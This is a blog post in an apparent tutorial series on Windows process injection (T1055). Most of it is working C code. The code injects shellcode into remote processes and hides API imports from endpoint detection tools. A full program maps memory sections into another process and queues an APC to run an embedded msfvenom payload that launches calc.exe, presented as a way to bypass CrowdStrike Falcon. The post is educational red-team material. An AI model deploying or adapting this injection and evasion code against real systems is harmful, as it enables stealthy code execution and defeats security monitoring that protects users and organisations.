<!DOCTYPE html><html lang="en-UK" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="T1055 - Basics of Process Injection - Part 2" /><meta name="author" content="Khush V" /><meta property="og:locale" content="en_UK" /><meta name="description" content="Back to Basics - Part 2" /><meta property="og:description" content="Back to Basics - Part 2" /><link rel="canonical" href="https://khushv.github.io/posts/Back-to-Basics-Process-Injection-102/" /><meta property="og:url" content="https://khushv.github.io/posts/Back-to-Basics-Process-Injection-102/" /><meta property="og:site_name" content="Khush’s Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-04-05T15:10:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="T1055 - Basics of Process Injection - Part 2" /><meta name="twitter:site" content="@" /><meta name="twitter:creator" content="@Khush V" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Khush V"},"description":"Back to Basics - Part 2","url":"https://khushv.github.io/posts/Back-to-Basics-Process-Injection-102/","@type":"BlogPosting","headline":"T1055 - Basics of Process Injection - Part 2","dateModified":"2021-04-05T15:10:00+01:00","datePublished":"2021-04-05T15:10:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://khushv.github.io/posts/Back-to-Basics-Process-Injection-102/"},"@context":"https://schema.org"}</script><title>T1055 - Basics of Process Injection - Part 2 | Khush's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Khush's Blog"><meta name="application-name" content="Khush's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/logo1.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Khush's Blog</a></div><div class="site-subtitle font-italic">Standing on the shoulders of giants.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/khushv" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>T1055 - Basics of Process Injection - Part 2</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>T1055 - Basics of Process Injection - Part 2</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Khush V </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Apr 5, 2021, 3:10 PM +0100" prep="on" > Apr 5 <i class="unloaded">2021-04-05T15:10:00+01:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2003 words">11 min</span></div></div><div class="post-content"><h1 id="back-to-basics---part-2">Back to Basics - Part 2</h1><p>In the last post, part 1 of this series, we were presented with a simple Proof of Concept code for injecting shellcode into processes. In this post, we’ll continue looking at different functions and techniques that can help us be stealthier. We’ll cover remote process injections, obfuscating function calls and using <code class="language-plaintext highlighter-rouge">ntdll</code> function calls.</p><h2 id="6---injecting-into-remote-processes">6 - Injecting into remote processes</h2><p>So far, we’ve been injecting code into the callee’s process, that is the local process executing this code. It is also possible to inject code into a different process, or what is known as a remote process.</p><p>The main change to the code is the following addition:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>	DWORD pid;
	if (argc &lt; 2) {
		printf("[*] Command: %s PID.\n", argv[0]);

		pid = GetCurrentProcessId();
		printf("[*] No process ID provided, using current process id %d.\n", pid);
		pid = GetCurrentProcessId();
	}
	else {
		pid = atoi(argv[1]);
		printf("[*] Using PID %d provided.\n", pid);

	}

	int payload_len = sizeof(payload);
	
	printf("[*] Attempting to get handle on process.\n");
	HANDLE  processHandle = OpenProcess(CREATE_THREAD_ACCESS, 0, pid);
	if (processHandle == 0) {
		printf("[*] Error opening process handle. Error: %d.\n", GetLastError());
		return -1;
	}
	printf("[*] Got process handle.\n");
</pre></table></code></div></div><p>The first conditional step checks whether a process ID (PID) has been provided. If it has not, the program assumes we want to inject code into the local process.</p><p>If a PID has been provided, the program attempts to get a <code class="language-plaintext highlighter-rouge">HANDLE</code> on this process using <code class="language-plaintext highlighter-rouge">OpenProcess</code> (https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess). It takes three parameters; the desired access we want, whether child processes will be able to inherit this handle and then the process ID. There’s about a dozen different process access rights that can be requested. Microsoft states the following:</p><p>“A handle to the process in which the thread is to be created. The handle must have the PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE, and PROCESS_VM_READ access rights, and may fail without these rights on certain platforms.”</p><p>However, from trial and error, I noticed the least amount of privilege we need is <code class="language-plaintext highlighter-rouge">CREATE_THREAD_ACCESS</code>.</p><p>Once a process handle has been provided, we carry on with the program as usual with a few changes. Notably the following:</p><ul><li>We change the <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> method to <code class="language-plaintext highlighter-rouge">VirtualAllocEx</code>, in order to be able to request memory allocation for a remote process. The additional parameter is to pass the process handle.<li>For some reason, RtlMoveMemory no longer worked for me and I’m assuming it’s because of some permissions issue copying memory across to a different processe’s virtual address space. Therefore I modified this to the <code class="language-plaintext highlighter-rouge">WriteProcessMemory</code>, which takes a process handle, destination, source and size of the memory to copy across.<li>Similarly, <code class="language-plaintext highlighter-rouge">CreateThread</code> has also changed to <code class="language-plaintext highlighter-rouge">CreateRemoteThread</code> in order to be able to start a thread in a remote process.</ul><p>Another peculiarity I came across while doing some research, is from Windows guru Raymond Chen, who describes <code class="language-plaintext highlighter-rouge">WriteProcessMemory</code> as being extremely accomodating. The function will temporarily change memory permissions so it can copy the data it needs to, before reverting back to the original permissions. Under the hood, it uses <code class="language-plaintext highlighter-rouge">VitualProtectEx</code> to do this, similar to what we have been using. This means we don’t necessarily need the first <code class="language-plaintext highlighter-rouge">VirtualAllocEx</code> call, as we can simply write memory to the process, granted we know where to write it to (an address in the virtual address space of the target process).</p><h2 id="7---obfuscate-function-calls">7 - obfuscate function calls</h2><p>Some EDR solutions will inspect the functions a program imports at runtime when deciding whether it is a harmful program or not. Let’s have a look at the imported functions of our latest code:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/9.png" alt="calc-running" /> <em>Imported functions.</em></p><p>Most of the functions we’ve used so far are found in <code class="language-plaintext highlighter-rouge">kernel32.dll</code>. We can pick out familliar functions from the list such as <code class="language-plaintext highlighter-rouge">OpenProcess</code>, <code class="language-plaintext highlighter-rouge">VirtualAllocEx</code> and <code class="language-plaintext highlighter-rouge">WriteProcessMemory</code>. The function addresses are computed and statically linked at compile time. Suppose we want to conceal these from prying eyes. One option is to calculate these function addresses dynamically at runtime. We can do this using <code class="language-plaintext highlighter-rouge">GetProcAddress</code>, which returns an address given a function name.</p><p>However, having a function address is not enough. We need to define the function so the compiler knows how to assemble the parameters. We’ll take the <code class="language-plaintext highlighter-rouge">VirtualAllocEx</code> function and dynamically resolve it at runtime. Let’s analyse the following code that allows us to do that:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>	typedef LPVOID (WINAPI * VirtualAllocExFunc)(
		HANDLE hProcess,
		LPVOID lpAddress,
		SIZE_T dwSize,
		DWORD  flAllocationType,
		DWORD  flProtect
	);
	HMODULE hModule = LoadLibraryA("kernel32.dll");
	VirtualAllocExFunc VirtualAllocEx = (VirtualAllocExFunc) GetProcAddress(hModule, "VirtualAllocEx");
	if (!VirtualAllocEx) {
		printf("[*] Error GetProcAddress for VirtualAllocEx. Error: %d.\n", GetLastError());
		return -1;
	}
	FreeLibrary(hModule);

</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">typedef</code> tells the compiler how the function is defined and what the parameter types are, similar to <code class="language-plaintext highlighter-rouge">struct</code>. We then load the <code class="language-plaintext highlighter-rouge">dll</code> using <code class="language-plaintext highlighter-rouge">LoadLibraryA</code> function. Using this module handle, we request the function address by calling <code class="language-plaintext highlighter-rouge">GetProcAddress</code>. With this address, we cast the function pointer into the structure that is VirtualAllocEx and then are able to call it as normal.</p><p>Compiling these and inspecting the Import Address Table (IAT), we can see that the <code class="language-plaintext highlighter-rouge">VirtualAllocEx</code> no longer appears in this list.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/10.png" alt="calc-running" /> <em>Concealed VirtualAllocEx function.</em></p><p>This can be applied to all the other functions that are to be concealed. This has been left as an exercise to the reader.</p><h2 id="8---redcursorcomau-bypassing-crowdstrike-endpoint-detection-and-response">8 - redcursor.com.au bypassing crowdstrike endpoint detection and response</h2><p>The last variation was a challenge of mine to see if I could code a proof of concept, only having the general gist of the functions involved. I came across a blogpost that described using specific unsupported/undocumented Windows functions to bypass CrowdStrike Falcon (https://www.redcursor.com.au/blog/bypassing-crowdstrike-endpoint-detection-and-response). The functions used were NtMapViewOfSection and NtQueueApcThread. By not writing memory in a remote process, it is possible in some cases to execute code on a host with an EDR installed. Not having used these functions, I had to give it a try.</p><h3 id="ntmapviewofsection">NtMapViewOfSection</h3><p>Windows treats a <code class="language-plaintext highlighter-rouge">Section</code> as a contiguous memory block that can be shared between processes. We will use <code class="language-plaintext highlighter-rouge">NtCreateSection</code> call to create a new section.</p><p>To utilise a <code class="language-plaintext highlighter-rouge">Section</code>, we need to map it to a <code class="language-plaintext highlighter-rouge">View</code> using <code class="language-plaintext highlighter-rouge">NtMapViewOfSection</code>, and specify appropriate RWX permissions. We will create a <code class="language-plaintext highlighter-rouge">View</code> that is local to the calling process and copying in the payload. This <code class="language-plaintext highlighter-rouge">View</code> should be writeable. We’ll then create a second <code class="language-plaintext highlighter-rouge">View</code> within the remote process that is executable. Writing the payload into the local section, should cause it to appear within the <code class="language-plaintext highlighter-rouge">View</code> of the remote process.</p><p>From this point, we can carry on as normal and call CreateRemoteThread and pass in the address pointing to the beginning of the payload. However, in this scenario, we’ll be calling NtQueueApcThread</p><h3 id="ntqueueapcthread">NtQueueApcThread</h3><p>Each thread in userland processes has their own Asynchronous Procedure Call (APC) queue. It is possible to queue some code to be executed when the thread enters an alertable state.</p><p>There are two main ways of programming this:</p><ul><li>Create a process in a suspended state, queue an APC and then resume it/alertable state<li>Enumerate thread for given PID, and use one of these. Possibly use CreateToolhelp32Snapshot to enumerate.</ul><p>In this case, because my aim is to be stealthy, we won’t be creating a new remote thread, albeit in a suspended state. We’ll assume we <em>magically</em> know the thread ID (can easily find this out via task manager) and pass this as a parameter to the program.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
</pre><td class="rouge-code"><pre>#include "Windows.h"
#include "stdio.h"
#include "8-shellcode-inject-variation-header.h"


#define CREATE_THREAD_ACCESS (PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE )
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) &gt;= 0)
#endif

/*
msfvenom -p windows/exec CMD=calc.exe -f c
length: 519 bytes
*/
unsigned char payload[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";


int main(int argc, char* argv[])
{

	DWORD pid;
	if (argc &lt; 3) {
		printf("[*] Command: %s PID ThreadId.\n", argv[0]);

		pid = GetCurrentProcessId();
		printf("[*] Error, no PID provided. Exiting.\n");
		return -1;
	}

	pid = atoi(argv[1]);
	printf("[*] Using PID %d provided.\n", pid);

	int payload_len = sizeof(payload);
	
	printf("[*] Attempting to get handle on process.\n");
	HANDLE  processHandle = OpenProcess(CREATE_THREAD_ACCESS, 1, pid);
	if (processHandle == 0) {
		printf("[*] Error opening process handle. Error: %d.\n", GetLastError());
		return -1;
	}
	printf("[*] Got process handle.\n");


	printf("[*] Attempting to create new section.\n");
	HMODULE hModule = LoadLibraryA("ntdll.dll");
	NtCreateSection NtCreateSection_func = (NtCreateSection)GetProcAddress(hModule, "NtCreateSection");
	NtMapViewOfSection NtMapViewOfSection_func = (NtMapViewOfSection)GetProcAddress(hModule, "NtMapViewOfSection");
	NtAlertResumeThread NtAlertResumeThread_func = (NtAlertResumeThread)GetProcAddress(hModule, "NtAlertResumeThread");
	NtQueueApcThread NtQueueApcThread_func = (NtQueueApcThread)GetProcAddress(hModule, "NtQueueApcThread");
	//check its not returned NULL

	HANDLE hSection = NULL;
	LARGE_INTEGER sectionSize = { 4096 };

	NTSTATUS createSection = NtCreateSection_func(
		&amp;hSection,				//SectionHandle
		(SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE),		//DesiredAccess
		NULL,					//ObjectAttributes
		(PLARGE_INTEGER)&amp;sectionSize,						//MaximumSize
		PAGE_EXECUTE_READWRITE,	//SectionPageProtection
		SEC_COMMIT,				//AllocationAttributes
		NULL					//FileHandle
	);
	//printf("[*] CreateSection status is %x.\n", a);
	if (!NT_SUCCESS(createSection))
	{
		printf("[*] Error: NtCreateSection_func failed with status %#x", createSection);
		return 0;
	}


	VOID * baseAddress = NULL;
	ULONG_PTR zeroBits = 0;
	SIZE_T viewSize = 0;
	

	printf("[*] Attempting to map view of new section to local process.\n");
	NTSTATUS mapView = NtMapViewOfSection_func(
		hSection,		//Section handle
		GetCurrentProcess(),	// process handle	// FFFFFFFF -&gt; current process?
		&amp;baseAddress,			// base address
		zeroBits,			// zero bits
		SIZE_T(4096),   //CommitSize,
		NULL,		//SectionOffset,
		&amp;viewSize,         //ViewSize,
		ViewUnmap, //InheritDisposition,
		MEM_TOP_DOWN,           //AllocationType,
		PAGE_READWRITE       //Win32Protect
	);
	if (!NT_SUCCESS(mapView))
	{
		printf("[*] Error: NtMapViewOfSection_func failed with status %#x.\n", mapView);
		return -1;
	}

	printf("[*] Attempting to copy over payload.\n");
	RtlMoveMemory(baseAddress, payload, payload_len);
	printf("[*] Wrote bytes.\n");


	printf("[*] Attempting to map view of section to remote process.\n");


	VOID * remoteAddress = NULL;
	ULONG_PTR zeroBitsRemote = 0;
	SIZE_T viewSizeRemote = 0;

	printf("[*] Address of remote pointer is %p.\n", remoteAddress);
	NTSTATUS mapViewRemote = NtMapViewOfSection_func(
		hSection,		//Section handle
		processHandle,	// process handle
		&amp;remoteAddress,			
		zeroBitsRemote,			// zero bits
		SIZE_T(4096),   //CommitSize,
		NULL,		//SectionOffset,
		&amp;viewSizeRemote,         //ViewSize,
		ViewUnmap, //InheritDisposition,
		MEM_TOP_DOWN,           //AllocationType,
		PAGE_EXECUTE_READ       //Win32Protect
	);
	printf("[*] Address of remote pointer is %p.\n", remoteAddress);
	if (!NT_SUCCESS(mapViewRemote))
	{
		printf("[*] Error: NtMapViewOfSection_func on remote process failed with status %#x.\n", mapViewRemote);
		return 0;
	}


	DWORD tId = atoi(argv[2]);
	printf("[*] Attempting to open thread %d.\n", tId);
	HANDLE hThread = OpenThread(THREAD_SET_CONTEXT| THREAD_SUSPEND_RESUME, FALSE, tId);
	if (hThread == 0) {
		printf("[*] Error opening remote thread. Error: %d.\n", GetLastError());
		return -1;
	}
	
	NTSTATUS queueStatus = NtQueueApcThread_func(
		hThread,
		(PIO_APC_ROUTINE)remoteAddress,
		NULL, NULL, NULL
	);
	if (!NT_SUCCESS(queueStatus))
	{
		printf("[*] Error: NtMapViewOfSection_func on remote process failed with status %#x.\n", queueStatus);
		return 0;
	}
</pre></table></code></div></div><p>These functions are found within <code class="language-plaintext highlighter-rouge">ntdll.dll</code>, which contains functions used for the Windows native API and are typically not used exposed for use directly. User available processes such as OpenProcess are often wrappers for these undocumented functions (NtOpenProcess). Because there is no export library for <code class="language-plaintext highlighter-rouge">ntdll.dll</code>, we have to dynamically resolve function addresses at runtime, similar to the technique used in the previous example. As of Windows 10, the SDK does release <code class="language-plaintext highlighter-rouge">ntdll.lib</code>, however I was not successful in linking this to my code. If anyone wants to give me any pointers, would appreciate that very much.</p><p>There are a couple differences when calling native API functions. These use the NTAPI caling convention, which declares that the callee will clean the stack after execution (<code class="language-plaintext highlighter-rouge">__stdcall</code>).</p><p>The second different is the return value of most Nt* functions. They return an <code class="language-plaintext highlighter-rouge">NTSTATUS</code> value. This is a 32 bit value that will indicate the result of function.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ttps/'>TTPs</a>, <a href='/categories/t1055-process-injection/'>T1055 - Process Injection</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/process-injection/" class="post-tag no-text-decoration" >process injection</a> <a href="/tags/t1055/" class="post-tag no-text-decoration" >T1055</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=T1055 - Basics of Process Injection - Part 2 - Khush's Blog&url=https://khushv.github.io/posts/Back-to-Basics-Process-Injection-102/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=T1055 - Basics of Process Injection - Part 2 - Khush's Blog&u=https://khushv.github.io/posts/Back-to-Basics-Process-Injection-102/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=T1055 - Basics of Process Injection - Part 2 - Khush's Blog&url=https://khushv.github.io/posts/Back-to-Basics-Process-Injection-102/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Back-to-Basics-Process-Injection-101/">T1055 - Basics of Process Injection - Part 1</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/process-injection/">process injection</a> <a class="post-tag" href="/tags/t1055/">T1055</a> <a class="post-tag" href="/tags/aws/">AWS</a> <a class="post-tag" href="/tags/certification/">certification</a> <a class="post-tag" href="/tags/cloud/">cloud</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Back-to-Basics-Process-Injection-101/"><div class="card-body"> <span class="timeago small" > Apr 5 <i class="unloaded">2021-04-05T15:10:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>T1055 - Basics of Process Injection - Part 1</h3><div class="text-muted small"><p> Introduction This guide aims to gently introduce the concepts of process injection, beginning with a naive and simple Proof of Concept code and iterating this with additional functionality such as...</p></div></div></a></div><div class="card"> <a href="/posts/Thoughts-on-AWS-Security-Specialty-Certification/"><div class="card-body"> <span class="timeago small" > Jun 22 <i class="unloaded">2021-06-22T01:00:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Thoughts on the AWS Security Specialty Certification</h3><div class="text-muted small"><p> Thoughts on the AWS Security Specialty Certification This is a brief post about In 2019, I undertook the AWS Certified Solutions Architect – Professional certification. I wanted to solidify my kno...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Back-to-Basics-Process-Injection-101/" class="btn btn-outline-primary" prompt="Older"><p>T1055 - Basics of Process Injection - Part 1</p></a> <a href="/posts/Thoughts-on-AWS-Security-Specialty-Certification/" class="btn btn-outline-primary" prompt="Newer"><p>Thoughts on the AWS Security Specialty Certification</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/#">Khush V</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/process-injection/">process injection</a> <a class="post-tag" href="/tags/t1055/">T1055</a> <a class="post-tag" href="/tags/aws/">AWS</a> <a class="post-tag" href="/tags/certification/">certification</a> <a class="post-tag" href="/tags/cloud/">cloud</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://khushv.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
